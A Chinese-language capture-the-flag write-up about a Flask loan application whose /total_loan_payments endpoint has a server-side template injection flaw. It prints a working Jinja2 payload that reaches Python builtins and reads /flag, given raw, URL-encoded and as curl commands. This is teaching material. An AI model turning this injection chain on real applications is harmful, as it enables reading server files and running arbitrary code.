# WriteUp

## 1、题目描述

这是一个 Flask Web 应用程序,存在服务端模板注入(SSTI)漏洞。应用程序包含用户登录、个人资料管理和贷款信息查看功能。其中 `/total_loan_payments` 端点存在明显的 SSTI 漏洞,可以被利用来读取服务器上的敏感文件。

## 2、知识点

- **Server-Side Template Injection (SSTI)**: 服务端模板注入漏洞
- **Flask/Jinja2 模板引擎**: Python Web 框架及其模板引擎
- **Python 沙箱逃逸**: 通过 `__init__`, `__globals__`, `__builtins__` 等魔术方法访问内置函数
- **HTTP 参数污染**: 利用 URL 参数进行 payload 注入

## 3、题目解题方法思路

### 漏洞位置

在 `total_loan_payments()` 函数的第 105-108 行:

```python
json_template = f"""
{{ "loan_principal": "{principal}" ,"monthly_payment": "{{{{ payment }}}}", "loan_term_amount": "{{{{ term }}}}", "total_loan_payments": "{{{{ payment*term }}}}" }}
"""
```

### 漏洞原理

1. `principal` 参数直接通过 f-string 插入到模板字符串中,未经任何过滤
2. 然后通过 `render_template_string()` 渲染,导致用户可控的内容被当作模板代码执行
3. 通过构造恶意的 `principal` 参数,可以注入 Jinja2 模板语法

### 关键利用链

- `self.__init__.__globals__.__builtins__` : 访问 Python 内置函数
- `open('/flag').read()` : 读取 flag 文件内容
- JSON 注入: 通过闭合 JSON 字符串,注入新的键值对来执行模板代码

### 使用工具

- 浏览器 (Chrome/Firefox)
- 或 curl/Burp Suite 等 HTTP 工具

## 4、解题步骤

### Step 1: 分析漏洞代码

观察 `total_loan_payments()` 路由,发现 `principal` 参数直接嵌入到 JSON 模板字符串中。

### Step 2: 构造 Payload

```
principal=a","flag":"{{ self.__init__.__globals__.__builtins__.open('/flag').read() }}"
```

**Payload 解析**:

- `a"` : 闭合原有的 `loan_principal` 值
- `,"flag":"..."` : 注入新的 JSON 键值对
- `{{ ... }}` : Jinja2 模板语法
- `self.__init__.__globals__.__builtins__.open('/flag').read()` : 读取 flag 文件

### Step 3: 访问目标 URL

需要先登录系统获取有效 session,然后访问:

```
http://target-url/total_loan_payments?payment=1&term=1&principal=a","flag":"{{ self.__init__.__globals__.__builtins__.open('/flag').read() }}"
```

URL 编码后:

```
http://target-url/total_loan_payments?payment=1&term=1&principal=a%22,%22flag%22:%22{{%20self.__init__.__globals__.__builtins__.open(%27/flag%27).read()%20}}%22
```

### Step 4: 获取 Flag

服务器返回的 JSON 响应中会包含读取的 flag 内容:

```json
{
  "loan_principal": "a",
  "flag": "[FLAG内容]",
  "monthly_payment": "1",
  "loan_term_amount": "1",
  "total_loan_payments": "1"
}
```

## 5、EXP (完整利用过程)

### 方法一: 使用浏览器

1. **登录系统**

   - 访问 `http://target-url/login`
   - 输入有效的用户名和密码登录

2. **执行 SSTI 攻击**

   - 在浏览器地址栏输入:

   ```
   http://target-url/total_loan_payments?payment=1&term=1&principal=a","flag":"{{ self.__init__.__globals__.__builtins__.open('/flag').read() }}"
   ```

3. **获取 Flag**
   - 查看返回的 JSON 响应中的 `flag` 字段值

### 方法二: 使用 curl

```bash
# 首先登录获取cookie
curl -c cookies.txt -X POST http://target-url/login \
  -d "username=YOUR_USERNAME&password=YOUR_PASSWORD"

# 然后执行SSTI攻击
curl -b cookies.txt "http://target-url/total_loan_payments?payment=1&term=1&principal=a%22,%22flag%22:%22{{%20self.__init__.__globals__.__builtins__.open(%27/flag%27).read()%20}}%22"
```

### 预期输出示例

```json
{
  "loan_principal": "a",
  "flag": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "monthly_payment": "1",
  "loan_term_amount": "1",
  "total_loan_payments": "1"
}
```

其中 `flag` 字段的值即为真实的 UUID 格式 flag。

---

**注意事项**:

- 必须先登录系统获取有效的 session,否则会被重定向到登录页面
- flag 文件路径可能是 `/flag` 或其他位置,根据实际情况调整
- URL 中的特殊字符需要进行 URL 编码
